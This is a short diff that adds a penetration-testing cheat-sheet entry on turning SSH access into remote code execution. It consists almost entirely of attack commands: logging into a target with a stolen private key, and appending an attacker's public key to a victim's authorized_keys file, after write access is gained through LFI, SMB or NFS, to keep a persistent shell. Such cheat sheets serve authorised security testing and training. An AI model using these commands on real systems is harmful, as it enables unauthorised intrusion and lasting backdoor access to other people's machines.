@@ -1,0 +1,8 @@
+SSH → RCE (key/cred chains)
+bash# Found id_rsa elsewhere → direct RCE via shell
+chmod 600 id_rsa
+ssh -i id_rsa user@target
+
+# Authorized_keys injection (if you have write access via LFI/SMB/NFS)
+echo "ssh-rsa YOUR_PUBKEY" >> /home/user/.ssh/authorized_keys
+ssh -i your_private_key user@target
